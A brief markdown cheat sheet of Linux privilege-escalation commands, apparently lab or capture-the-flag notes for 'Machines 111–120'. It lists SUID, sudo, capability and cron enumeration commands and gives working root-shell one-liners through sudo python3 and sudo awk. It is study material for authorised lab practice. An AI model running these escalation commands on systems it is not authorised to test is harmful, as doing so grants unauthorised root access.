## 🛡️ Privilege Escalation (Machines 111–120)

```bash
# Sudo Permissions
sudo -l                               # Check user sudo rights
sudo -l | tee sudo_check.txt          # Save sudo permissions for analysis

# SUID Files
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Interesting Cron Jobs
cat /etc/crontab
ls -la /etc/cron*
pspy64                          # Monitor for cron jobs or scheduled tasks

# Kernel & Exploit Checks
uname -a
searchsploit linux kernel <version>
exploitdb/exploit suggester tools (e.g., linpeas.sh, Linux Exploit Suggester)

# Exploit Examples:
# If python allowed
sudo python3 -c 'import os; os.system("/bin/bash")'

# GTFOBins
https://gtfobins.github.io/

# Example from Machine 114:
# Sudo permission: awk with NOPASSWD
sudo awk 'BEGIN {system("/bin/sh")}'

# Example from Machine 119:
# SUID binary: /usr/bin/screen-4.5.0
# Used local exploit for screen version
```
